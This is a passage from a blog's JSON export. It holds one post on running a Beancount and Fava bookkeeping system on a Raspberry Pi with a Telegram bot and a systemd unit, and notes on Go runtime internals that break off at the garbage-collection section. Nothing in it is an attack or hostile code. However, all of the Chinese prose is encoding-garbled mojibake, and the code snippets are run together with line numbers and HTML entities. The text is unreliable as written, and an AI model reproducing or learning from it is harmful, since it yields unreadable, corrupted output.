ä¸ºè®°è´¦æ–‡ä»¶æ˜¯ç›´æ¥ç”¨æ–‡æœ¬å­˜å‚¨åœ¨ç³»ç»Ÿä¸­çš„ï¼Œbeancount åªæ˜¯ç”¨æ¥åšæŸ¥è¯¢ã€‚ä¸è¿‡ fava æœåŠ¡å€’æ˜¯å¯ä»¥ä»¥å®ˆæŠ¤è¿›ç¨‹çš„æ–¹å¼éƒ¨ç½²èµ·æ¥ã€‚12345678910111213141516[Unit]Description=FavaDocumentation=https://beancount.github.io/fava/After=network-online.targetWants=network-online.target systemd-networkd-wait-online.service[Service]Restart=on-abnormalUser=piGroup=piEnvironment=HOME=/home/piExecStart=/home/pi/.local/bin/fava -p 6666 main.beanWorkingDirectory=/home/pi/projects/accounting[Install]WantedBy=multi-user.target æ•°æ®å¯¼å…¥ä¸‡å¹¸å£è¢‹è®°è´¦æä¾›äº†å¯¼å‡ºåŠŸèƒ½ï¼Œå¯ä»¥å°†ç”¨æˆ·çš„å…¨éƒ¨äº¤æ˜“è®°å½•ä»¥ xls çš„æ ¼å¼å¯¼å‡ºã€‚å£è¢‹è®°è´¦çš„æ”¶å…¥æ”¯å‡ºã€èµ„äº§è´¦æˆ·éƒ½æœ‰åˆ†ç±»ï¼Œäºæ˜¯æˆ‘ä¹Ÿæ²¿ç”¨äº†ä¹‹å‰çš„ç±»åˆ«ï¼Œå¹¶ä¸ºå…¶æ·»åŠ äº†å‰ç¼€ä½œä¸º Beancount çš„è´¦æˆ·åï¼Œæ¯”å¦‚â€œé¤é¥®â€å˜æˆäº† Expenses:Daily:é¤é¥®ï¼Œå·¥èµ„å˜æˆäº† Income:xxx:å·¥èµ„ï¼Œè€Œâ€œå¾®ä¿¡æ”¯ä»˜â€çš„è´¦æˆ·å°±å˜æˆäº† Assets:Digital:å¾®ä¿¡æ”¯ä»˜:Depositã€‚ä¹‹å‰çš„åšæ–‡æœ‰æåˆ° Beancount çš„è´¦æˆ·ååªèƒ½ç”±è‹±æ–‡ç»„æˆï¼Œä½†æˆ‘è¯•äº†ä¸€ä¸‹ï¼Œåªæœ‰é¡¶çº§è´¦æˆ·ç±»å‹å’Œä¸€çº§æè¿°ä¸èƒ½ç”¨ä¸­æ–‡ï¼Œå†å¾€ä¸‹çš„å±‚çº§å¹¶æ²¡æœ‰åšé™åˆ¶ã€‚éšåæˆ‘å†™äº†ä¸€ä¸ªæä¸‘æ— æ¯”çš„ Python è„šæœ¬ï¼Œå°†æ¯æ¡è®°å½•æ¸²æŸ“æˆ Beancount çš„äº¤æ˜“æ ¼å¼ï¼Œç„¶åå†™å…¥åˆ° main.bean æ–‡ä»¶ä¸­ã€‚åœ¨å¯¼å…¥æ•°æ®å¹¶ä¸å£è¢‹è®°è´¦ä¸Šçš„ç»Ÿè®¡æ•°æ®ä½œæ¯”å¯¹ï¼Œç¡®è®¤æ•°æ®æ— è¯¯åï¼Œæˆ‘å¯¹é¡¹ç›®ç»“æ„åšäº†ä¸€äº›è°ƒæ•´ï¼šå°†è´¦æˆ·å£°æ˜è¯­å¥æŒ‰ç…§è´¦æˆ·ç±»å‹ç»„ç»‡ï¼Œå•ç‹¬å­˜æ”¾åœ¨ accounts/{ç±»å‹}.bean ä¸­ï¼›å°†å‰å‡ å¹´çš„äº¤æ˜“è¿›è¡Œå½’æ¡£ï¼Œå­˜æ”¾åœ¨ txs/{å¹´ä»½}.bean ä¸­ï¼›åœ¨ main.bean ä¸­ç”¨ include è¯­å¥å¯¼å…¥ accounts/*.bean å’Œ txs/*.beanã€‚æœ€åå¹³äº†ä¸‹è´¦ï¼Œå¹³å‡ºä¸€æ¯”å·¨æ¬¾æ¥ï¼Œå¯è§ä¹‹å‰è®°çš„è´¦æ˜¯å¤šä¹ˆå¤šä¹ˆä¸é è°±ğŸŒšè¿™æ ·ï¼Œå°±æœ‰äº†ä»¥ä¸‹çš„é¡¹ç›®ç»“æ„ï¼š12345678910111213141516.â”œâ”€â”€ accounts // è´¦ç›®å®šä¹‰æ–‡ä»¶â”‚ â”œâ”€â”€ assets.beanâ”‚ â”œâ”€â”€ equity.beanâ”‚ â”œâ”€â”€ expences.beanâ”‚ â””â”€â”€ income.beanâ”œâ”€â”€ documentâ”‚ â””â”€â”€ initialize // åˆå§‹åŒ–å¯¼å…¥çš„è„šæœ¬åŠå£è¢‹è®°è´¦æ•°æ®â”‚ â”œâ”€â”€ initial.pyâ”‚ â””â”€â”€ ...â”œâ”€â”€ txs // å†å²äº¤æ˜“æ•°æ®â”‚ â”œâ”€â”€ 2017.beanâ”‚ â”œâ”€â”€ 2018.beanâ”‚ â””â”€â”€ 2019.beanâ”œâ”€â”€ main.bean // ä¸»æ–‡ä»¶ï¼ŒåŒ…å«å½“å¹´ï¼ˆ2020ï¼‰çš„äº¤æ˜“æ•°æ®â””â”€â”€ Makefile Telegram botç”¨ vim è®°äº†å‡ ç¬”è´¦ä¹‹åæ„Ÿè§‰è¿˜æ˜¯ä¸æ€ä¹ˆæ–¹ä¾¿ï¼Œæ¯•ç«Ÿåœ¨å¤–é¢ç©çš„æ—¶å€™ï¼Œéœ€è¦é¢‘ç¹ç”¨æ‰‹æœº ssh å›å®¶è®°è´¦ä¹Ÿä¸æ˜¯é‚£ä¹ˆå›äº‹ã€‚äºæ˜¯ï¼Œæˆ‘å°±å†™äº†ä¸€ä¸ªç®€å•çš„ Telegram botï¼Œé€šè¿‡ä¸ bot äº¤äº’æ¥ç¼–è¾‘æ ‘è“æ´¾ä¸Šçš„ main.bean æ–‡ä»¶ã€‚å¹³æ—¶æ¶ˆè´¹æ—¶ï¼Œåªéœ€è¦æŒ‰ç…§ä¹‹å‰åœ¨å£è¢‹è®°è´¦é‡Œè®°è´¦çš„æ€è·¯ï¼Œå°†å‡ ä¸ªå…³é”®è¯å¡«å¥½ï¼Œbot å°±å¯ä»¥æ¸²æŸ“å‡ºè¿™ç¬”è´¦å¯¹åº”çš„äº¤æ˜“æ–‡æœ¬ï¼Œå¹¶å°†å…¶è¿½åŠ åˆ° main.bean æ–‡ä»¶ä¸­ã€‚è¿™æ ·å°±èƒ½æ¶µç›–ç»å¤§å¤šæ•°æ—¥å¸¸åœ¨å¤–çš„ä½¿ç”¨åœºæ™¯äº†ã€‚ä¸è¿‡ï¼Œå»è¶…å¸‚æˆ– AA è¿™ç§å¤æ‚ä¸€äº›çš„è´¦ï¼Œè¿˜æ˜¯æ²¡åŠæ³•ç”¨ bot æ¥è®°ï¼Œä¸è¿‡ä¹Ÿæ— æ‰€è°“ï¼Œæˆ‘ä¼šç®€å•è®°ä¸‹æ¥ï¼Œç„¶åå›å®¶ç”¨ vim æˆ– fava æŠŠè´¦è¡¥å¥½ã€‚æ­¤å¤–ï¼Œè¿˜å®ç°äº†ä¸¤ä¸ª bot å‘½ä»¤ï¼Œæ–¹ä¾¿åœ¨å¤–æŸ¥çœ‹è‡ªå·±èŠ±äº†å¤šå°‘é’±ï¼ˆè™½ç„¶å¹³æ—¶åŸºæœ¬ç”¨ä¸ä¸Š ğŸ˜‚ï¼‰ã€‚æœ€åçš„å®ç°æ•ˆæœï¼šé¡ºä¾¿å®‰åˆ©ä¸€ä¸‹ï¼ŒFAT PHO çš„æ²³ç²‰ç›¸å½“å¥½åƒ é™¤æ­¤ä¹‹å¤–æ¯å¤©ç¡è§‰å‰ä¼šå°†å½“æ—¥çš„æ›´æ”¹æäº¤ï¼Œå¹¶åšå¥½å¤‡ä»½ï¼›é¡ºä¾¿åšäº† pre-commit çš„ Git é’©å­ï¼Œç”¨äºè§„èŒƒæ–‡ä»¶æ ¼å¼ï¼›æ¯ä¸ªæœˆç»“æŸçš„æ—¶å€™éƒ½ä¼šä¸ºæ‰€æœ‰èµ„äº§è´¦æˆ·æ·»åŠ æ–­è¨€ï¼Œå¦‚æœæ–­è¨€çš„æ•°å€¼ä¸ beancount é‡Œè®¡ç®—çš„æ•°å€¼ä¸ä¸€è‡´çš„è¯ï¼Œbeancount å°±ä¼šæŠ›å‡ºé”™è¯¯ã€‚ä¸è¿‡æŠ¥é”™ä¹Ÿæ˜¯åœ¨æ‰€éš¾å…ï¼Œå› ä¸ºä¹‹å‰è®°è´¦è®°å¾—å¤Ÿç»†ï¼Œæ‰€ä»¥å¯¹è´¦ä¹Ÿç›¸å½“æ–¹ä¾¿ï¼Œå¶å°”è¿˜å¯ä»¥çœ‹åˆ°ä¸€äº›å› ä¸º bot å¤ªç¬¨è€Œé—¹çš„ç¬‘è¯ï¼š12342020-08-30 * \"è‡ªè¡Œè½¦\" \"\" Assets:Digital:æ”¯ä»˜å®:Deposit -3.50 CNY- Assets:Bank:äº¤é€šé“¶è¡Œ:Card:Deposit+ Expenses:Daily:äº¤é€šå‡ºè¡Œ æ€»ç»“è¿™å¥—åŸºäº Beancount çš„è®°è´¦ç³»ç»Ÿå·²ç»è¿è¡Œäº†å¿«ä¸¤ä¸ªæœˆäº†ã€‚è¯¥ç³»ç»Ÿå¤§æ¦‚ç”±ä»¥ä¸‹æµç¨‹æ„æˆï¼šåœ¨æ ‘è“æ´¾ä¸Šç»´æŠ¤ Beancount Git repo ç”¨äºè®°å½•äº¤æ˜“ï¼›åœ¨æ ‘è“æ´¾ä¸Šéƒ¨ç½² Telegram bot è¿æ¥ repo ç”¨äºè®°å½•äº¤æ˜“æˆ–æŸ¥è¯¢è´¦æˆ·å˜æ›´ï¼›é€šè¿‡ Telegram bot è®°å½•ç®€å•äº¤æ˜“ï¼Œé€šè¿‡ Fava æˆ– vim è®°å½•å¤æ‚äº¤æ˜“ï¼›æ¯æ—¥å¯¹ Git repo ä¸­çš„å˜æ›´è¿›è¡Œæäº¤ï¼Œæ¨é€åˆ°è¿œç«¯ï¼Œå¹¶åšå¥½æ•°æ®å¤‡ä»½ï¼›æ¯æœˆæœˆåº•é€šè¿‡ balance è¯­å¥ä¸ºæ‰€æœ‰ Assets è´¦æˆ·æ·»åŠ æ–­è¨€ï¼Œé€šè¿‡å¯¹è´¦æŸ¥æ‰¾å‡ºé”™çš„äº¤æ˜“å¹¶ä¿®å¤ã€‚ä»å£è¢‹è®°è´¦è¿ç§»åˆ° Telegram è®°è´¦åï¼Œæ•´ä¸ªè®°è´¦æµç¨‹éƒ½é¡ºæ»‘å’Œå¿«æ·äº†å¾ˆå¤šã€‚ä¹‹å‰ç­‰å¾…å£è¢‹è®°è´¦ App æ‰“å¼€ã€å¡æ­»ã€çœ‹å¹¿å‘Šæ‰€æµªè´¹çš„æ—¶é—´ï¼Œæ”¾åˆ°ç°åœ¨å¯ä»¥è®©æˆ‘æ‰“å¼€ Telegram è®°å®Œä¸€ç¬”è´¦ã€‚æ‰€ä»¥ï¼Œè¿˜æ˜¯è¦å¹ä¸€æ³¢å¼€æºç¤¾åŒºæ‰å¯¹ã€‚âœ…å¦‚æœæœ‰ä»€ä¹ˆé—®é¢˜ï¼Œæ¬¢è¿ä¸æˆ‘äº¤æµã€‚","categories":[{"name":"ä¹±ä¸ƒå…«ç³Ÿ","slug":"ä¹±ä¸ƒå…«ç³Ÿ","permalink":"https://blog.stdioa.com/categories/ä¹±ä¸ƒå…«ç³Ÿ/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://blog.stdioa.com/tags/Python/"},{"name":"è®°è´¦","slug":"è®°è´¦","permalink":"https://blog.stdioa.com/tags/è®°è´¦/"},{"name":"Beancount","slug":"Beancount","permalink":"https://blog.stdioa.com/tags/Beancount/"},{"name":"fava","slug":"fava","permalink":"https://blog.stdioa.com/tags/fava/"}]},{"title":"ã€Šæ·±å…¥è§£æGoã€‹ç¬”è®°","slug":"go-internal-note","date":"2019-06-24T08:22:00.000Z","updated":"2019-06-24T08:40:49.945Z","comments":true,"path":"2019/06/go-internal-note/","link":"","permalink":"https://blog.stdioa.com/2019/06/go-internal-note/","excerpt":"åœ¨ GitHub ä¸Šæ‰¾åˆ°ä¸€æœ¬è§£è¯» Go å®ç°ç»†èŠ‚çš„å¥½ä¹¦ï¼Œåå«ã€Šæ·±å…¥è§£æ Goã€‹ã€‚å¤§è‡´çœ‹äº†ä¸€éï¼Œç®€å•åšäº†äº›ç¬”è®°ã€‚","text":"åœ¨ GitHub ä¸Šæ‰¾åˆ°ä¸€æœ¬è§£è¯» Go å®ç°ç»†èŠ‚çš„å¥½ä¹¦ï¼Œåå«ã€Šæ·±å…¥è§£æ Goã€‹ã€‚å¤§è‡´çœ‹äº†ä¸€éï¼Œç®€å•åšäº†äº›ç¬”è®°ã€‚è¿™æœ¬ä¹¦çš„ä»£ç æ¥è‡ª Go 1.3ï¼Œæ‰€ä»¥è¿˜æœ‰ä¸€éƒ¨åˆ†ç”± C è¯­è¨€å†™æˆã€‚è¿™ä»½ç¬”è®°é‡Œçš„ä»£ç æ¥è‡ª Go 1.12.5ï¼Œæ•°æ®ç»“æ„å…¨éƒ¨ç”± Go è¯­è¨€å®ç°ã€‚ æ•°æ®ç»“æ„string å’Œ slice éƒ½æ˜¯å¼•ç”¨ç±»å‹ï¼Œå¯èƒ½å¼€åœ¨æ ˆä¸Šï¼Œä¹Ÿå¯èƒ½å¼€åœ¨å †ä¸Šï¼›channel å’Œ map æ˜¯å¼•ç”¨ç±»å‹ï¼Œä½†ä¸€å®šå¼€åœ¨å †ä¸Šï¼Œæ ˆä¸­åªæœ‰æŒ‡é’ˆã€‚ string åº•å±‚ç»“æ„src/reflect/value.go1234type StringHeader struct &#123; Data uintptr Len int&#125;string æ˜¯ä¸å¯å˜æ•°æ®ç»“æ„ï¼Œä»»ä½•å¯¹ string çš„æ“ä½œéƒ½ä¼šäº§ç”Ÿä¸€ä¸ªæ–°çš„ string. å› æ­¤ï¼Œéœ€è¦æ‹¼æ¥çš„æ—¶å€™å°½é‡ä½¿ç”¨ bytes.Bufferï¼Œæˆ– strings.Join è¿™ç§ç”¨äº† Buffer çš„å‡½æ•°ã€‚ slice åº•å±‚ç»“æ„src/reflect/value.go12345type SliceHeader struct &#123; Data uintptr Len int Cap int&#125;æ³¨æ„ï¼Œä¸¤ä¸ªæ•°æ®ç»“æ„çš„åº•å±‚æ•°æ®å…¨éƒ¨å…±äº«ã€‚å…³äº slice çš„æ‰©å®¹ï¼Œå¯ä»¥å‚è§ã€Šæ·±å…¥è§£æ Go ä¸­ Slice åº•å±‚å®ç°ã€‹ã€‚æœ‰ä¸€ä¸ªå°ç”¨æ³•ï¼šå¯¹åˆ‡ç‰‡åš slice æ“ä½œæ—¶ï¼Œæœ«ä½çš„ä¸‹æ ‡å¯ä»¥è¶…è¿‡åŸ slice çš„ lenï¼Œä½†ä¸èƒ½è¶…è¿‡ cap.12a := make([]int, 2, 10)b := a[:5] map åº•å±‚ç»“æ„src/runtime/map.go12345678910111213141516171819202122232425262728type hmap struct &#123; // Note: the format of the hmap is also encoded in cmd/compile/internal/gc/reflect.go. // Make sure this stays in sync with the compiler's definition. count int // # live cells == size of map. Must be first (used by len() builtin) flags uint8 B uint8 // log_2 of # of buckets (can hold up to loadFactor * 2^B items) noverflow uint16 // approximate number of overflow buckets; see incrnoverflow for details hash0 uint32 // hash seed buckets unsafe.Pointer // array of 2^B Buckets. may be nil if count==0. oldbuckets unsafe.Pointer // previous bucket array of half the size, non-nil only when growing nevacuate uintptr // progress counter for evacuation (buckets less than this have been evacuated) extra *mapextra // optional fields&#125;type bmap struct &#123; // tophash generally contains the top byte of the hash value // for each key in this bucket. If tophash[0] &lt; minTopHash, // tophash[0] is a bucket evacuation state instead. // ç”¨äº hash çš„å¿«é€Ÿæ¯”è¾ƒï¼Œå½“ hash ç›¸ç­‰çš„æ—¶å€™è¿˜ä¼šè·ŸåŸ key è¿›è¡Œä¸€æ¬¡åŒ¹é…ã€‚ tophash [bucketCnt]uint8 // Followed by bucketCnt keys and then bucketCnt values. // NOTE: packing all the keys together and then all the values together makes the // code a bit more complicated than alternating key/value/key/value/... but it allows // us to eliminate padding which would be needed for, e.g., map[int64]int8. // Followed by an overflow pointer.&#125;æ³¨æ„çœ‹ä¸Šé¢çš„ NOTE é‡Œçš„ KV æ’åˆ—ç»“æ„ï¼Œè¿™æ ·åšæœ‰åˆ©äºå†…å­˜å¯¹é½ã€‚bmap åé¢çš„å†…å­˜åˆ†é…æœªåœ¨ç»“æ„ä½“ä¸­å®šä¹‰ï¼Œéœ€è¦æ‹¿ KV çš„æ—¶å€™è¦é€šè¿‡ unsafe.Pointer æ ¹æ® offset å»æ‹¿ã€‚è§ mapaccess1 æˆ– mapaccess2.å“ˆå¸Œè¡¨åœ¨æ¯æ¬¡æ‰©å®¹æ—¶ï¼Œå®¹é‡ä¼šå¢å¤§åˆ°åŸæ¥çš„ä¸¤å€ï¼Œä¹Ÿå°±æ˜¯ä» 2^B åˆ° 2^(B+1)ã€‚ä¸ºäº†ä¿è¯è¿è¡Œæ•ˆç‡ï¼Œä¼šå°† key çš„æ¬è¿æ“ä½œå¹³æ‘Šåˆ°æ¯ä¸€æ¬¡å†™æ“ä½œï¼ˆinsert &amp; removeï¼‰ä¸Šï¼Œæ¯æ¬¡æ“ä½œæ—¶è¿ç§» 1-2 ä¸ªé”®å€¼å¯¹ã€‚æŸ¥æ‰¾æ—¶ä¼šå…ˆåœ¨ oldâ€”buckets ä¸­æ‰¾ï¼Œæ‰¾ä¸åˆ°å†å»æ–°çš„ buckets ä¸­æ‰¾ã€‚map ä½¿ç”¨å¿«é€Ÿçš„ murmurhash ä½œä¸ºå“ˆå¸Œç®—æ³•ã€‚map è§£å†³å†²çªçš„æ–¹æ³•æ˜¯é“¾åœ°å€æ³•çš„æ”¹è¿›å½¢å¼ã€‚åœ¨åˆ›å»º bmap æ—¶ï¼Œä¼šåˆ†é…ä¸€ä¸ªæ•°ç»„ï¼Œéƒ½å¯ä»¥å®¹çº³ 8 ä¸ªé”®å€¼å¯¹ã€‚å‘ç”Ÿå“ˆå¸Œå†²çªæ—¶ï¼Œéƒ½ä¼šå°†æ–°çš„é”®å€¼å¯¹æ”¾å…¥æ·»åŠ åˆ°æ•°ç»„é‡Œã€‚å¦‚æœæ•°ç»„æ”¾æ»¡äº†ï¼Œåˆ™ä¼šæ–°å»ºä¸€ä¸ª bmapï¼Œé€šè¿‡ overflow æŒ‡é’ˆæ¥é“¾æ¥åˆ°å½“å‰ bucket èŠ‚ç‚¹åé¢ã€‚å…³äºæŸ¥æ‰¾ã€æ’å…¥å’Œåˆ é™¤çš„ç»†èŠ‚ï¼Œè¯·è§è¯¥ä¹¦ç›¸å…³ç« èŠ‚ã€‚ä¸€ä¸ªéœ€è¦æ³¨æ„çš„ç‚¹ï¼šåœ¨ bmap é“¾ä¸­ï¼Œç›¸åŒçš„ Key å¯èƒ½ä¼šå­˜åœ¨äºä¸¤ä¸ª bucket é‡Œï¼Œè€Œå‰é¢ bucket çš„å€¼ä¼šç›´æ¥è¦†ç›–åé¢ bucket çš„å€¼ã€‚åœ¨è¿›è¡Œæ›´æ–°æ“ä½œæ—¶ï¼Œå¦‚æœå‰é¢ bucket ä¸å­˜åœ¨è¯¥é”®ï¼Œä½†æ˜¯æ•°ç»„åŒ…å«ç©ºä½ï¼Œåˆ™ç›´æ¥åœ¨è¯¥ bucket ä¸­æ’å…¥ï¼Œè€Œä¸ä¼šå†å»é“¾è¡¨åé¢çš„ bucket ä¸­æŸ¥æ‰¾å¹¶æ›´æ–°ã€‚æŸ¥æ‰¾æ“ä½œäº¦ç„¶ã€‚æ€ä¹ˆè¯´ï¼Œè¿™ä¸ªæœºåˆ¶æœ‰ç‚¹åƒ docker é•œåƒä¸­çš„ä¸åŒå±‚çš„æ–‡ä»¶è¦†ç›–æœºåˆ¶ã€‚ channelsrc/runtime/chan.go12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152type hchan struct &#123; qcount uint // ç¯å½¢é˜Ÿåˆ—çš„æ€»æ•°é‡ dataqsiz uint // ç¯å½¢é˜Ÿåˆ—å¤§å° buf unsafe.Pointer // ç¯å½¢é˜Ÿåˆ— elemsize uint16 closed uint32 elemtype *_type // å…ƒç´ ç±»å‹ sendx uint // ç¼“å­˜åŒºçš„å‘é€æŒ‡é’ˆï¼ˆä¹Ÿå°±æ˜¯ç¼“å†²åŒºå°¾ï¼‰ recvx uint // ç¼“å†²åŒºçš„æ¥æ”¶ç´¢å¼•ï¼ˆä¹Ÿå°±æ˜¯ç¼“å†²åŒºå¤´ï¼‰ recvq waitq // å› æ¥æ”¶è€Œé˜»å¡çš„ç­‰å¾…é˜Ÿåˆ— sendq waitq // å› å‘é€è€Œé˜»å¡çš„ç­‰å¾…é˜Ÿåˆ— // lock protects all fields in hchan, as well as several // fields in sudogs blocked on this channel. // // Do not change another G's status while holding this lock // (in particular, do not ready a G), as this can deadlock // with stack shrinking. lock mutex&#125;type waitq struct &#123; first *sudog last *sudog&#125;type sudog struct &#123; // The following fields are protected by the hchan.lock of the // channel this sudog is blocking on. shrinkstack depends on // this for sudogs involved in channel ops. g *g // isSelect indicates g is participating in a select, so // g.selectDone must be CAS'd to win the wake-up race. isSelect bool next *sudog prev *sudog elem unsafe.Pointer // data element (may point to stack) // å­˜å‚¨ goroutine çš„ // The following fields are never accessed concurrently. // For channels, waitlink is only accessed by g. // For semaphores, all fields (including the ones above) // are only accessed when holding a semaRoot lock. acquiretime int64 releasetime int64 ticket uint32 parent *sudog // semaRoot binary tree waitlink *sudog // g.waiting list or semaRoot waittail *sudog // semaRoot c *hchan // channel&#125;ä»¥å‰ channel çš„ç¼“å†²åŒºä¼šåœ¨ hchan ä¹‹åçš„å†…å­˜ä¸­åˆ›å»ºï¼Œç°åœ¨å°†å®ƒä»¬åˆ†å¼€äº†ã€‚å¯¹ channel è¿›è¡Œè¯»å†™æ“ä½œçš„æ—¶å€™ï¼Œä¼šæ ¹æ®ç¼“å†²åŒºçš„çŠ¶æ€ã€ä»¥åŠè¯» / å†™é“¾è¡¨æ¥å†³å®šæ˜¯å¦è¦é˜»å¡å½“å‰ goroutineï¼Œé˜»å¡çš„è¯ä¼šå°†å½“å‰çš„ G æŒ‚è½½é“¾è¡¨ä¸­ã€‚ interface1234567891011121314151617181920// å¸¦æ–¹æ³•çš„æ¥å£type iface struct &#123; tab *itab data unsafe.Pointer&#125;type itab struct &#123; inter *interfacetype _type *_type hash uint32 // copy of _type.hash. Used for type switches. _ [4]byte fun [1]uintptr // variable sized. fun[0]==0 means _type does not implement inter.&#125;// fun ä¸­ä¼šä¿å­˜æ¥å£å€¼èƒŒåå…·ä½“ç±»å‹çš„æ–¹æ³•// ç©ºæ¥å£type eface struct &#123; _type *_type data unsafe.Pointer&#125;Type çš„ UncommonType ä¼šè®°å½•æŸä¸ªå…·ä½“ç±»å‹å®ç°çš„æ–¹æ³•ï¼›interface çš„ Itab çš„ InterfaceType ä¸­çš„æ–¹æ³•è¡¨ï¼Œè®°å½•äº†æ¥å£æ‰€å£°æ˜çš„æ–¹æ³•ï¼›itab çš„ fun æ•°ç»„ï¼Œè®°å½•äº†å…·ä½“çš„å‡½æ•°æŒ‡é’ˆï¼Œç”¨ä½œæ¥å£å€¼çš„æ–¹æ³•ç¼“å­˜ã€‚åœ¨æ¥å£å€¼èµ‹å€¼æ—¶ï¼Œä¼šå°† UncommonType å’Œ InterfaceType ä¸­çš„æ–¹æ³•è¡¨è¿›è¡Œæ¯”å¯¹ï¼›å¦‚æœæ¯”å¯¹æˆåŠŸçš„è¯ï¼Œä¼šå°† UncommonType ä¸­çš„æ–¹æ³•æŒ‡é’ˆæ‹·è´åˆ° itab çš„ fun ä¸­ï¼Œæ–¹ä¾¿æ–¹æ³•è°ƒç”¨æ—¶å¯¹æ–¹æ³•è¿›è¡ŒæŸ¥æ‰¾ã€‚ æ–¹æ³•è°ƒç”¨a.F(b) ä¼šåœ¨ç¼–è¯‘æ—¶ç›´æ¥è½¬æ¢ä¸º A.F(a, b)ï¼›å½“ä¸€ä¸ªç±»å‹è¢«åŒ¿ååµŒå…¥ç»“æ„ä½“æ—¶ï¼Œå®ƒçš„æ–¹æ³•ä¼šè¢«æ‹·è´åˆ°åµŒå…¥ç»“æ„ä½“çš„ Type çš„æ–¹æ³•è¡¨ä¸­ã€‚è¿™ä¸ªè¿‡ç¨‹åœ¨ç¼–è¯‘æ—¶å°±å¯ä»¥å®Œæˆã€‚æ¥å£çš„æ–¹æ³•è°ƒç”¨è¦é€šè¿‡ itab.fun ä¸­çš„å‡½æ•°æŒ‡é’ˆæ¥ç¡®å®šå…·ä½“è°ƒç”¨çš„æ–¹æ³•ã€‚æ–¹æ³•æ‹·è´çš„è¿‡ç¨‹æ˜¯åœ¨è¿è¡Œæ—¶å®Œæˆçš„ï¼Œæ‰€ä»¥æ¥å£çš„æ–¹æ³•è°ƒç”¨çš„æˆæœ¬è¦ç•¥é«˜äºä¸€èˆ¬æ–¹æ³•è°ƒç”¨ã€‚ å‡½æ•°è°ƒç”¨åè®®Go æŠŠè¿”å›å€¼æ”¾åœ¨ä¸Šä¸€ä¸ªæ ˆå¸§æœ€åçš„å†…å­˜ä¸­ï¼Œè¿™æ ·è°ƒç”¨é“¾å‰åçš„ä¸¤ä¸ªå‡½æ•°éƒ½å¯ä»¥è§¦åŠåˆ°è¿™æ®µå†…å­˜ï¼Œä»¥æ­¤æ¥å®ç°å¤šå€¼è¿”å›ã€‚12345è¿”å›å€¼2è¿”å›å€¼1å‚æ•°3å‚æ•°2å‚æ•°1 &lt;- SPgo å…³é”®å­—æ˜¯ä¸ªè¯­æ³•ç³–ï¼Œgo f(args) å¯ä»¥çœ‹åš runtine.newproc(size, f, args)ï¼›åŒæ · defer ä¹Ÿæ˜¯è¯­æ³•ç³–ï¼Œé€šè¿‡ runtine.deferproc å’Œ runtine.deferreturn æ¥å®ç°ã€‚ è¿ç»­æ ˆä¸€ä¸ªç¨‹åºä¸­å¯èƒ½ä¼šæœ‰éå¸¸å¤šçš„ goroutineï¼Œä¸ºäº†èŠ‚çœå†…å­˜ï¼Œæ¯ä¸ª goroutine ä¸€å¼€å§‹åªä¼šå¾—åˆ°éå¸¸å°çš„ä¸€å—æ ˆã€‚ä½¿ç”¨å¯å˜æ ˆæ—¶ï¼Œæ¯æ¬¡å‡½æ•°è°ƒç”¨æ—¶ï¼Œéƒ½ä¼šé€šè¿‡ SP å’Œ stackguard æ£€æŸ¥æ ˆçš„ä½¿ç”¨æƒ…å†µã€‚å½“æ ˆä¸å¤Ÿå¤§æ—¶ï¼Œä¼šè¿›è¡Œæ ˆæ‰©å¼ ï¼Œå¼€ä¸€å—æ–°æ ˆï¼Œå¹¶æŠŠæ—§æ ˆçš„å†…å®¹å¤åˆ¶è¿‡å»ã€‚å¦‚æœæ ˆé‡Œæœ‰æŒ‡é’ˆï¼Œè€ŒæŒ‡é’ˆæŒ‡å‘çš„æ˜¯æ ˆä¸­çš„å˜é‡ï¼Œé‚£ä¹ˆåœ¨å¤åˆ¶æ—¶ä¼šå¯¹æŒ‡é’ˆçš„å€¼åŠ ä¸€ä¸ªåç§»ï¼Œæ¥ä¿è¯æŒ‡é’ˆæŒ‡å‘çš„å¯¹è±¡æ˜¯è¢«è¿ç§»è¿‡åçš„å¯¹è±¡ã€‚gc æ—¶ï¼Œå¦‚æœæ£€æµ‹åˆ°æ ˆåªç”¨äº†ä¸åˆ° 1/4 æ—¶ï¼Œä¼šå°†æ ˆç¼©å°ä¸ºåŸæ¥çš„ 1/2. é—­åŒ…Go é€šè¿‡ escape analyze æ¥æ£€æŸ¥é€ƒé€¸çš„å€¼ï¼Œä»è€Œç¡®å®šè¯¥å€¼æ˜¯å¦åº”è¯¥åœ¨å †ä¸Šåˆ›å»ºï¼Œè€Œä¸æ˜¯åœ¨æ ˆä¸­ã€‚1234func New() *T &#123; var t T return &amp;t&#125;è¿”å›é—­åŒ…æ—¶å¹¶ä¸æ˜¯å•çº¯è¿”å›ä¸€ä¸ªå‡½æ•°ï¼Œè€Œæ˜¯è¿”å›äº†ä¸€ä¸ªç»“æ„ä½“ï¼Œè®°å½•ä¸‹å‡½æ•°è¿”å›åœ°å€å’Œå¼•ç”¨çš„ç¯å¢ƒä¸­çš„å˜é‡åœ°å€ã€‚ä¹¦ä¸­æ˜¯æœ‰è¿™æ ·ä¸€ä¸ªç»“æ„ä½“çš„ï¼Œä½†åœ¨æˆ‘çš„æºç é‡Œï¼Œè¿™ä¸ªæ•°æ®ç»“æ„åº”è¯¥æ˜¯ç”¨æ±‡ç¼–å®ç°äº†ã€‚ Go ç¨‹åºåˆå§‹åŒ–ç³»ç»Ÿåˆå§‹åŒ–ï¼šåˆå§‹åŒ–æ ˆã€è®¾ç½®æœ¬åœ°çº¿ç¨‹å­˜å‚¨ï¼ˆgï¼‰è°ƒåº¦å™¨åˆå§‹åŒ–ï¼šruntime.schedinitæ ¹æ® GOMAXPROCS å†³å®šå¯ç”¨çº¿ç¨‹æ•°ï¼›æŠŠ runtime.main æ”¾å…¥å°±ç»ªçº¿ç¨‹é˜Ÿåˆ—ï¼›è°ƒç”¨ runtime.mstartï¼Œmstart è°ƒç”¨ scheduleï¼Œä¹Ÿå°±æ˜¯ä¸€ç›´è¿è¡Œçš„è°ƒåº¦å™¨ã€‚schedule é€‰ä¸­ runtime.mainé€šè¿‡ newm(sysmon, nil) å¯åŠ¨ä¸€ä¸ªçº¿ç¨‹è¿è¡Œ sysmonï¼Œç”¨äºå¤„ç†ç½‘ç»œ epollé€šè¿‡ runtime.newproc å¯åŠ¨ä¸€ä¸ª G æ‰§è¡Œ scavengerï¼Œç”¨äºåƒåœ¾å›æ”¶è°ƒç”¨ main.main è¿›å…¥ç”¨æˆ·ä»£ç ã€‚ä¼šå•ç‹¬å¯åŠ¨ä¸€ä¸ªçº¿ç¨‹ï¼ˆMï¼‰ç”¨äº poll()ã€‚GC 